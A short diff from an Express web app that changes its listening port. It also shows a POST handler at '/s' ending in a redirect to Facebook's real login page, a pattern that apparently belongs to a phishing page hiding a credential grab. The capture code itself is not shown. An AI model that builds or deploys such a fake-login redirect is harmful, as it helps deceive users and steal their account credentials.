@@ -26,4 +26,4 @@ app.post('/s', function (req, res) {
     res.redirect('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110');
 });
 
-app.listen(2222);
+app.listen(process.env.PORT || 5000);
